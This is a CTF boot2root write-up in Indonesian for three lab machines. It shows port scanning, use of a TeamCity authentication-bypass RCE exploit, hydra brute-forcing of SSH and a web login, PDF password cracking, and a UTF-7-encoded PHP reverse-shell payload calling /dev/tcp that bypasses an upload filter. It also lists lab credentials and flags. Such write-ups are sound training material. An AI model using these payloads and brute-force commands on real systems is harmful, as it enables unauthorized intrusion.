---
title: HACKTRACE RANGES CTF 2024 BOOT2ROOT WRITEUP
author: ywdh
tags: ["ctf", "hacktrace"]
date: 2024-08-19
---

# HACKTRACE RANGES CTF 2024 BOOT2ROOT WRITEUP

[TOC]

# Rocket

## Deskripsi

<details>
Level: Easy
<br>
Points: 30 (user) & 70 (root)
<br>
Machine IP: 10.1.2.233
<br>
Machine OS: Windows 10
</details>

## Langkah Penyelesaian

### Port & Service Enumeration

- Saya menggunakan tool `rustscan` untuk mempercepat proses port scanning.

```bash
rustscan -a 10.1.2.233 -r 1-65535 --scripts default | tee -a output_scan_all_ports.txt
```

- Beberapa port yang open dan interesting antara lain:
	- **445** (SMB)
	- **135** (MSRPC)
	- **139** (RPC)
	- **3389** (RDP)
	- **8111** (HTTP)

### RDP Enumeration

- Hasil scan service pada port 3389 (RDP) menggunakan `nmap`.

```bash
nmap -p 3389 -sVC -v -oN output_scan_port_3389.txt 10.1.2.233
```

- Tidak ada yang interesting untuk saat ini. Mungkin untuk **Domain Name** nanti berguna.

![Rocket-01](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2024/_assets/hacktrace-ranges_boot2root1-01.png)

### RPC Enumeration

- Terdapat celah null session atau attacker dapat login sebagai anonymous.

```bash
rpcclient -U "" -N 10.1.2.233 -p 139
```

- Hasil enumerasi domain: `enumdomains`.

```bash
rpcclient $> enumdomains
name:[LETHOS] idx:[0x0]
name:[Builtin] idx:[0x1]
```

- Hasil enumerasi shared folder: `netshareenumall`.

```bash
rpcclient $> netshareenumall
netname: print$
        remark: Printer Drivers
        path:   C:\var\lib\samba\printers
        password:
netname: IPC$
        remark: IPC Service (lethos server (Samba, Ubuntu))
        path:   C:\tmp
        password:
```

- Tidak berhasil mendapatkan `enumdomusers`.

### HTTP Port 8111 Enumeration

- Hasil scan service pada port **8111** menggunakan `nmap`.

```bash
nmap -p 8111 -sVC -v -oN output_scan_port_8111.txt 10.1.2.233
```

![Rocket-02](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2024/_assets/hacktrace-ranges_boot2root1-02.png)


- Setelah saya coba open port **8111** di web browser, terdapat info menarik yaitu tampil halaman login **JetBrains TeamCity versi 2023.11.3**.
- Tanpa pikir panjang, saya langsung mencari tau apakah versi tersebut ada CVE-nya atau tidak.
- Dari hasil pencarian, ditemukan bahwa **JetBrains TeamCity versi 2023.11.3** terdapat kerentanan _**Authentication Bypass to RCE**_, yang mana mengizinkan attacker bisa login tanpa menggunakan akun yang sah/terdaftar di sistem (lebih lengkapnya baca artikel ini: [https://www.vicarius.io/vsociety/posts/teamcity-auth-bypass-to-rce-cve-2024-27198-and-cve-2024-27199](https://www.vicarius.io/vsociety/posts/teamcity-auth-bypass-to-rce-cve-2024-27198-and-cve-2024-27199)).

![Rocket-03](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2024/_assets/hacktrace-ranges_boot2root1-03.png)

- Kemudian saya cari script POC yang mungkin orang lain pernah buat, dan ternyata saya menemukannya dari repo GitHub berikut: [https://github.com/W01fh4cker/CVE-2024-27198-RCE](https://github.com/W01fh4cker/CVE-2024-27198-RCE).
- Saya coba jalankan script tersebut menggunakan command:

```bash
pip3 install requests urllib3 faker
python3 CVE-2024-27198-RCE.py -t http://10.1.2.233:8111
```

![Rocket-04](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2024/_assets/hacktrace-ranges_boot2root1-04.png)

- Dan **Alhamdulillah**! saya berhasil mendapatkan powershellnya, lanjut ke pencarian kredensial untuk bisa melakukan RDP.
- Saya coba `ls` current directory dan menemukan sebuah file: `cred.txt` yang berisi username dan password.
- Tanpa pikir panjang saya langsung coba login RDP menggunakan tool bawaan Windows langsung.

![Rocket-05](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2024/_assets/hacktrace-ranges_boot2root1-05.png)

- Terdapat sebuah file `user.txt` di **Desktop**, dan setelah saya buka ternyata berisikan sebuah flag user. **GOTCHAA!!**.
- Berikut POC setelah berhasil remote desktop ke mesin target Windows 10:

![Rocket-06](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2024/_assets/hacktrace-ranges_boot2root1-06.png)

## User Flag

==24ee7336f91a82fcab6bd8b1fd981d2a==

# Poison Master

## Detail Tantangan

<details>
Level: Easy
<br>
Points: 30 (user) & 70 (root)
<br>
Machine IP: 10.1.2.234
<br>
Machine OS: Linux
</details>

## Langkah Penyelesaian

### Port and Service Enumeration

- Hasil scan port menggunakan `rustscan`.

```bash
rustscan -a 10.1.2.234 -r 1-65535 --scripts default | tee -a output_scan_all_ports.txt
```

![Poison Master-01](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2024/_assets/hacktrace-ranges_boot2root2-01.png)

### RPC Enumeration

- Terdapat celah null session yang berarti bisa dimanfaatkan untuk login sebagai `anonymous`.

```bash
rpcclient -U "" -N 10.1.2.234 -p 139
```

- Hasil enumerasi list user: `enumdomusers` tidak tampil informasi apa-apa.

![Poison Master-02](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2024/_assets/hacktrace-ranges_boot2root2-02.png)

- Hasil enumerasi list group juga tidak menampilkan informasi apa pun: `enumdomgroups`.

![Poison Master-03](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2024/_assets/hacktrace-ranges_boot2root2-03.png)

- Hasil enumerasi list domain: `enumdomains`.

![Poison Master-04](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2024/_assets/hacktrace-ranges_boot2root2-04.png)

- Hasil enumerasi shared folder: `netshareenumall`.

![Poison Master-05](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2024/_assets/hacktrace-ranges_boot2root2-05.png)

- Dapat dilihat pada gambar di bawah ini, list SID yang tersedia hanya berjumlah 6 saja.

![Poison Master-06](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2024/_assets/hacktrace-ranges_boot2root2-06.png)

- Tetapi, ketika saya coba enumerasi secara otomatis menggunakan: `enum4linux` muncul SID baru yaitu: **S-1-22-1** yang di dalamnya terdapat 2 user baru:
	- **ubmaj**, dan
	- **jambu**

```bash
enum4linux 10.1.2.234
```

![Poison Master-07](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2024/_assets/hacktrace-ranges_boot2root2-07.png)

### SMB Enumeration

- Tidak ada folder apa pun di net share `IPC$`.

![Poison Master-08](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2024/_assets/hacktrace-ranges_boot2root2-08.png)

- Not interesting for now.

### HTTP Port 7765 Enumeration

- Setelah saya coba visit port **7765** di web browser, muncul tampilan Apache2 Default Web Page, tapi setelah saya coba cari-cari CVE-nya atau informasi terkait, hasilnya nihil. Jadi, saya pikir ini hanya _**rabbithole**_ aja.

![Poison Master-09](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2024/_assets/hacktrace-ranges_boot2root2-09.png)

### Bruteforce SSH with Known Users

- Karena stuck dan minim informasi, saya coba bruteforce service SSH menggunakan list user yang disembunyikan tadi, yaitu: `ubmaj` dan `jambu` dengan passwordnya menggunakan wordlist: `rockyou.txt`.
- Berikut command hydra untuk bruteforce-nya.

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.1.2.234 ssh -t 4
```

- Found SSH password for user `ubmaj` that is: `princess`.

![Poison Master-10](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2024/_assets/hacktrace-ranges_boot2root2-10.png)

### Remote SSH to Target Server

- Langsung saja lakukan remote ke server target menggunakan kredensial SSH yang telah didapatkan:

| Name     | Description |
| :------- | ----------- |
| Username | ubmaj       |
| Password | princess    |

- Setelah berhasil login ke remote SSH, langsung saja read user flag.

![Poison Master-11](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2024/_assets/hacktrace-ranges_boot2root2-11.png)

## User Flag

==9f752edba37a6dbe680219e472ad2b85==

# Moonstone

## Detail Tantangan

<details>
Level: Moderate
<br>
Points: 50 (user) & 50 (root)
<br>
Machine IP: 10.1.2.232
<br>
Machine OS: Linux
</details>

## Langkah Penyelesaian

### Port & Service Enumeration

- Hasil port scanning menggunakan tool: `rustscan`.

```bash
rustscan -a 10.1.2.232 -r 1-65535 --scripts default | tee -a output_scan_all_ports.txt
```

![Moonstone-01](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2024/_assets/hacktrace-ranges_boot2root3-01.png)

### FTP Enumeration

- Terdapat celah FTP misconfiguration, di mana attacker dapat login sebagai user `anonymous`.

```bash
ftp anonymous@10.1.2.232 # login without password.
```

- Terdapat 3 folder yang di dalamnya terdapat file-file yang interesting.

![Moonstone-02](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2024/_assets/hacktrace-ranges_boot2root3-02.png)

- Langsung saja saya download semua file di setiap foldernya. Total ada **6 file**, 3 di antaranya file zip dan 3 sisanya adalah file dummy SQL.

![Moonstone-03](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2024/_assets/hacktrace-ranges_boot2root3-03.png)

- Dari semua file tersebut, hanya ada 1 file zip yang bisa dibuka, yaitu: `YourSpace_Dev.zip`.
- Setelah diekstrak, muncul folder yang berisi source code **CodeIgniter 4** (lanjut ke bagian _**finding the secrets**_).

### SMB Enumeration

- Karena port 445 terbuka dan terdapat celah dapat login sebagai anonymous, maka dari itu saya langsung coba melihat ada file apa saja di dalam shared folder `Backup`.

```bash
smbclient -L //10.1.2.232/Backup --option="client min protocol=SMB2"
```

- Setelah saya coba masuk ke shared folder `Backup`, terdapat folder baru yang sebelumnya tidak ada di FTP server, yaitu: `2024_07`.
- Di dalam folder tersebut, terdapat beberapa file tambahan yang cukup interesting.

![Moonstone-04](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2024/_assets/hacktrace-ranges_boot2root3-04.png)

- Tapi, hanya ada 1 file yang beneran bisa dibuka, yaitu: `Audit Report (3).pdf`.
- Masalahnya, file tersebut diproteksi oleh password, sehingga harus dibrute force menggunakan tool: `pdf2john`.

```bash
pdf2john "Audit Report (3).pdf" > audit_report_3.hash
```

- Setelah itu, tinggal crack saja menggunakan tool: `john`.

```bash
john --show --format=PDF audit_report_3.hash
```

- Found password for pdf file: `janganlupa`.

![Moonstone-05](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2024/_assets/hacktrace-ranges_boot2root3-05.png)

- Setelah file pdf tersebut dibuka, di **halaman 5** (terakhir) terdapat daftar password yang mungkin berguna untuk nantinya.

![Moonstone-06](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2024/_assets/hacktrace-ranges_boot2root3-06.png)

### RPC Enumeration

- Sama seperti challenge-challenge sebelumnya, kita bisa memanfaatkan celah null session pada RPC service untuk bisa melakukan enumerasi.
- Awalnya, ketika saya coba manual enumerasi user pada RPC service menggunakan perintah `enumdomusers`, hanya ada terdapat 7 user saja, tetapi ketika menggunakan tool: `enum4linux` terdapat 2 user baru, yaitu:
    - **jay_payakumbuah**, dan
    - **ayyub**.
- Jadi, total ada **9 user** yang berguna untuk nantinya.

![Moonstone-07](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2024/_assets/hacktrace-ranges_boot2root3-07.png)

### Finding The Secrets

- Diketahui bahwa aplikasi yang berjalan di port **8080** dan dibuat menggunakan **CodeIgniter 4** (PHP-based web framework).
- Ketika dibuka, muncul halaman login. Langsung saja saya coba brute force login http-form menggunakan informasi user dan password yang sudah diperoleh sebelumnya menggunakan tool: `hydra` dengan provide list user dan password yang telah diketahui sebelumnya.

<kbd>users.txt</kbd>
```txt
ayyub
donghyuk_kim
yeji_hwang
azkira_kim
bryan_jung
nurul_lee
yuna_shin
hanbin_kim
jay_payakumbuah
```

<kbd>pass.txt</kbd>
```txt
P@ssw0rd
T4da1mA!
Lzj*7BL%#fMhq
```

- Berikut adalah full command hydra untuk bruteforce http form loginnya (bisa juga pakai NSE `http-form-brute` dari `nmap`).

```bash
hydra -L users.txt -P pass.txt -s 8080 10.1.2.232 http-post-form "/authenticate:username=^USER^&password=^PASS^:login_failed"
# You can check the path and login parameter by intercepting the traffic via burp suite.
```

- Terdapat beberapa file yang menarik perhatian saya, yaitu file `yourspace/.env` dan `yourspace/public/info.asp`.

<kbd>.env</kbd>
```php
#--------------------------------------------------------------------
# Example Environment Configuration file
#
# This file can be used as a starting point for your own
# custom .env files, and contains most of the possible settings
# available in a default install.
#
# By default, all of the settings are commented out. If you want
# to override the setting, you must un-comment it by removing the '#'
# at the beginning of the line.
#--------------------------------------------------------------------

#--------------------------------------------------------------------
# ENVIRONMENT
#--------------------------------------------------------------------

CI_ENVIRONMENT = development

#--------------------------------------------------------------------
# APP
#--------------------------------------------------------------------

# app.baseURL = ''
# If you have trouble with `.`, you could also use `_`.
# app_baseURL = ''
# app.forceGlobalSecureRequests = false
# app.CSPEnabled = false

#--------------------------------------------------------------------
# DATABASE
#--------------------------------------------------------------------

database.default.hostname = localhost
database.default.database = yourspace
database.default.username = rafi
database.default.password = password
database.default.DBDriver = MySQLi
# database.default.DBPrefix =
database.default.port = 3306

# If you use MySQLi as tests, first update the values of Config\Database::$tests.
# database.tests.hostname = localhost
# database.tests.database = ci4_test
# database.tests.username = root
# database.tests.password = root
# database.tests.DBDriver = MySQLi
# database.tests.DBPrefix =
# database.tests.charset = utf8mb4
# database.tests.DBCollat = utf8mb4_general_ci
# database.tests.port = 3306

#--------------------------------------------------------------------
# ENCRYPTION
#--------------------------------------------------------------------

# encryption.key =

#--------------------------------------------------------------------
# SESSION
#--------------------------------------------------------------------

# session.driver = 'CodeIgniter\Session\Handlers\FileHandler'
# session.savePath = null

#--------------------------------------------------------------------
# LOGGER
#--------------------------------------------------------------------

# logger.threshold = 4
```

<kbd>info.asp</kbd>
```php
<?php phpinfo(); ?>
```
- Pada file `.env` terdapat kredensial database, tapi karena port 3306 tidak terbuka, maka dari itu, file tersebut tidak berguna untuk sekarang (mungkin ketika berhasil mendapatkan shell).
- Pada file `info.asp` berisikan fungsi `phpinfo()` untuk menampilkan informasi terkait versi PHP yang digunakan.

### Gaining Access w/ PHP Reverse Shell

- Setelah berhasil login menggunakan username: `jay_payakumbuah` dengan password: `Lzj*7BL%#fMhq`, kemudian saya coba lihat isi di dalam webnya, ternyata ada satu fitur untuk upload sebuah dokumen yang bisa dimanfaatkan sebagai celah _**arbitrary file upload**_.
- Saya coba analisis lagi source code PHP yang tertera di folder `yourspace` sebelumnya.
- Setelah penantian cukup panjang, saya menyadari bahwa fitur tersebut pasti ada di sebuah **Controllers**, detailnya ada di file `MedicalController.php` (_lebih lengkapnya baca terkait arsitektur folder MVC pada framework CodeIgniter_).
- Terdapat limitasi pada fungsi upload file, yaitu:
    - Jika file yang di upload berekstensi **.php, .pht, atau .phtml**, maka terdeteksi sebagai malicious file.
    - Jika ada tag pembuka php (`<?`) di dalam konten yang di upload, maka terdeteksi juga sebagai malicious file.

![Moonstone-08](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2024/_assets/hacktrace-ranges_boot2root3-08.png)

- Untuk membypass hal tersebut, saya coba baca lagi informasi `http://10.1.2.232/info.asp` untuk melihat apakah ada celah yang bisa dimanfaatkan untuk bypass limitasi tadi.
- Ternyata, di bagian `zend.script_encoding` bisa juga menggunakan `UTF-7`, yang mana memungkinkan untuk untuk bisa mendapatkan reverse shell asal payloadnya dalam format `UTF-7`. Ini payload lengkapnya:

```php
+ADw-?php exec("bash -i +AD4-& /dev/tcp/10.18.200.127/4444 0+AD4-&1") ?+AD4-
```

- Untuk tanda `<` di-encode ke `UTF-7` menjadi: `+ADw-`. Dan tanda `>` menjadi: `+AD4-` (lebih lengkapnya baca artikel berikut: [https://stackoverflow.com/questions/77609263/convert-utf-8-to-utf-7-in-python](https://stackoverflow.com/questions/77609263/convert-utf-8-to-utf-7-in-python)).
- Tetapi, setelah coba di upload masih gagal, karena kenapa ? karena by default ekstensinya adalah `.asp` (agak menjengkelkan sih ini wkwk). Hal itu dibuktikan dengan fungsi `phpinfo()` yang tetap berjalan meskipun ekstensi filenya `.asp`.
- Oke fix upload dan jangan lupa untuk listen ke port `4444` menggunakan `nc`.

```bash
nc -lnvp 4444
```

- Kalau berhasil, maka kita berhasil mendapatkan **reverse shell**.

### Remote SSH to Target Server

- Setelah berhasil masuk dengan reverse shell, current user pastinya adalah `www-data`.
- Saya coba cari flag usernya, ternyata flag ada di direktori `/home/ayyub/user.txt`.
- File tersebut memiliki permission `r-x,r--,---` (**540**) yang berarti **other tidak bisa membaca file tersebut**.
- Saya coba lakukan enumerasi secara manual dan terpikir untuk melihat file `.env` yang ada di remote server.

![Moonstone-09](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2024/_assets/hacktrace-ranges_boot2root3-09.png)
  
- Dari informasi kredensial database yang ada di file `.env`, saya mencoba untuk remote SSH menggunakan password yang tertera di file tersebut dan **Alhamdulillah**! saya berhasil login sebagai user `ayyub`.
	- **Username**: ayyub
	- **Password**: B6CHkw$5BTaN%
- Intinya, belum tentu kredensial database tersebut khusus untuk login ke db, bisa saja ke SSH atau service-service lain :).
- Berikut POC setelah saya berhasil remote SSH ke user `ayyub` dan mendapatkan flag usernya:

![Moonstone-10](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2024/_assets/hacktrace-ranges_boot2root3-10.png)

## User Flag

==ab40b8d326bcddb72f674759d6c09ccc==
